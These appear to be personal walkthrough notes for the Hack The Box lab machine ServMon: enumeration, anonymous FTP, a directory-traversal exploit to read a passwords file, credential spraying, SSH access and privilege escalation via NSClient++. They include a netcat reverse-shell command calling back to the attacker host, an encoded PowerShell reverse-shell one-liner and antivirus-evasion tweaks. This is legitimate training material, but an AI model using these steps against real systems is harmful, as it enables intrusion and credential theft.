
#Enumeration #nmap 

`sudo nmap -sC -v -sV -oA nmap/servmon 10.10.10.184`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`
`-v for verbose`

At the same time run 

`sleep 300; sudo nmap -p- 10.10.10.184 -oA servmon-allports`

Open ports

![[Pasted image 20241213212152.png]]
Odd that SMB and SSH are both open

How to identify OS? Ping it. 

`ping -c 1 10.10.10.184`
Notice `ttl` is 127. 
Default ttl for Windows is 128
Default ttl for Linux is 64
![[Pasted image 20241213212426.png]]
Start by enumerating #smb with #smbclient 

`smbclient -U '' -L //10.10.10.184` (nothing)
`smbclient -U 'guest' -L //10.10.10.184` (nope)
`smbclient -U 'anonymous' -L //10.10.10.184` (nada)

Navigate to website 

![[Pasted image 20241213212851.png]]
Putting special characters in to try to get a sql injection error message 

Start up #burpsuite

Changing the language on the site can help with file inclusion exploits? 

![[Pasted image 20241213213309.png]]
Notice this is a `.htm` site 

![[Pasted image 20241213213348.png]]

XML Login 

![[Pasted image 20241214173340.png]]
Possible #xml entity injection

Moving on... 

Using #gobuster to look for more pages


`gobuster dir -u 'http://10.10.10.184/Pages/' -x htm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o dirbust-out 

Weird response:
![[Pasted image 20241214203212.png]]

Troubleshooting weird response with burpsuite

Remember to add -p flag if burpsuite is proxying

`gobuster dir -u 'http://10.10.10.184/Pages/' -x htm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o dirbust-out -p http://127.0.0.1:8080`

Determined gobuster isn't going to work for this site. 

Looking at #ftp 

`ftp 10.10.10.184`

`anonymous:anonymous` login worked. 

![[Pasted image 20241214203759.png]]
`ftp> cd Users`
Found two users, Nadine and Nathan

![[Pasted image 20241214203918.png]]
Nadine has `Confidential.txt` file 

`ftp> get Confidential.txt`

Nathan has `Notes to do.txt` file 

`ftp> get Notes to do.txt`

`exit`

Contents of confidential.txt

![[Pasted image 20241214204305.png]]

Passwords.txt on Nathan's desktop, if he's seen it check in secure folder. Where is secure folder?

Contents of `Notes to do.txt`

![[Pasted image 20241214204449.png]]
Sharepoint? 

Found nsclient on port 8443

`http//10.10.10.184:8443`

![[Pasted image 20241214204721.png]]
Website was just hoopdy looking in firefox. 

There's a login page if chrome is used. 

![[Pasted image 20241214205005.png]]
Clicked "Forgotten password?"

![[Pasted image 20241214205047.png]]

Trying #searchsploit

`searchsploit nvms`

![[Pasted image 20241214205450.png]]

`searchsploit -x hardware/webapps/47774.txt`
`-x for examine`

![[Pasted image 20241214205526.png]]
Entering the directory traversal into burpsuite 

![[Pasted image 20241214205646.png]]
Entered file path to Nathan's desktop instead and got the passwords.txt file.

![[Pasted image 20241214205835.png]]
Saving these passwords to a file. 

Trying #crackmapexec 

`crackmapexec smb 10.10.10.184 -u users.tx -p passwords.txt`

![[Pasted image 20241214210259.png]]
We may be able to see file shares now with #smbclient 

`smbclient -U Nadine -L //10.10.10.184`

![[Pasted image 20241214210432.png]]

Using #crackmapexec to connect via ssh

`crackmapexec ssh 10.10.10.184 -u nadine -p passwords.txt`

![[Pasted image 20241214222657.png]]
 Trying `ssh` 
 `ssh nadine@10.10.10.184`

Gained initial access. 

![[Pasted image 20241214222914.png]]
Enumerating.. 
`systeminfo`

![[Pasted image 20241214223009.png]]
Have microsoft version. Not any leads when googling the version. 

Checking her files for NVM application:

![[Pasted image 20241214223245.png]]

Found it `NVMS-1000`

![[Pasted image 20241214223523.png]]
#TIP: Always grab the configuration files of webservers because often times there are secrets in them that get you code execution on the box 

Found `BasicConfig.ini` (nothing interesting)
![[Pasted image 20241214223753.png]]

found `nsclient.ini`

allow arguments is a dangerous flag
![[Pasted image 20241214224058.png]]

![[Pasted image 20241214224257.png]]

Remembering the password prompt thing from earlier...then in initial access shell run:

`nscp.exe web -- password --display`

![[Pasted image 20241214224617.png]]
Tried to login with password but getting 403 not allowed 

![[Pasted image 20241214224724.png]]
Ssh port forwarding from initial access shell.

`ssh> -L 8443:127.0.0.1:8443`

![[Pasted image 20241215132213.png]]
Visit `http://127.0.0.1:8443` on web browser.
![[Pasted image 20241215134928.png]]

Got nsclient. Can paste the password for nadine in.

There's a place to input scripts on the site. 

![[Pasted image 20241215205325.png]]
Finding out what scripts/powershell.ps1 is (it's nothing)

Searching searchsploit

`searchsploit nsclient`

![[Pasted image 20241215210108.png]]
![[Pasted image 20241215210315.png]]
doing ping first

Creating encoded ping command using tools in parrot os

`echo 'ping -n 1 10.10.14.2' | iconv -t utf-16le |base64 -w 0`

![[Pasted image 20241215210605.png]]

Then pasting highlighted command on site 

![[Pasted image 20241215210652.png]]
Then on parrot

`sudo tcpdump -i tun0 icmp`

![[Pasted image 20241215210810.png]]

Basically following the steps from this searchsploit thing 

![[Pasted image 20241216183721.png]]

![[Pasted image 20241216182901.png]]
Instead of step 3...

from nadine's access:

`echo powershell -enc cABphdksdhddsgvsdkdhkv > pleasesub.bat`

![[Pasted image 20241216183926.png]]

Starting tcpdump from parrot box:

![[Pasted image 20241216183957.png]]

Execute `pleasub.bat` from nadine's access:

![[Pasted image 20241216184105.png]]

Can also execute command from the console

![[Pasted image 20241216184548.png]]
Now let's get a #reverseshell using #nishang [[Nishang]]
https://github.com/samratashok/nishang/tree/master/Shells
We want `Invoke-PowershellTcpOneLine.ps1`

![[Pasted image 20241216184814.png]]
We want the one-liner so that it can be encoded. 

Have to choose which one to use so using this one:
![[Pasted image 20241216185233.png]]
Change IP to attacker machine IP address and pick a port like 9001

Encode it. 

`cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0`

![[Pasted image 20241216185458.png]]

Now executing this encoded command from nadine's initial access shell. 

![[Pasted image 20241216185558.png]]

Start #netcat listener on parrot 

`nc -lvnp 9001`

![[Pasted image 20241216185645.png]]

Run pleasesub.bat from website console

This was blocked by the AV. lul

![[Pasted image 20241216185808.png]]

Modifying one-liner to evade detection:
1. renamed function names from $sm to $PleaseSubscribe
2. Replacing $d with $likethisvideo
3. Try executing script in smaller segments


![[Pasted image 20241216190113.png]]
![[Pasted image 20241216190322.png]]
Gives up with AV evasion. 

Just gets reverse shell using netcat.. 

Copying nc.exe to `www` and curling it from nadine's shell is interesting method. 

![[Pasted image 20241216190638.png]]

![[Pasted image 20241216190657.png]]
Start netcat listener on parrot

![[Pasted image 20241216190745.png]]
From nadine's shell execute:

`nc.exe -e cmd 10.10.14.2 9001`

![[Pasted image 20241216190915.png]]

^ that was just a test to make sure netcat command was correct. want to run this command to the console command. 

`echo C:\temp\nc.exe -e cmd 10.10.14.2 9001 > pleasesub.bat`

Reset netcat listener. 

Execute PleaseSub from website console. 

Got reverse shell. 

![[Pasted image 20241216191246.png]]
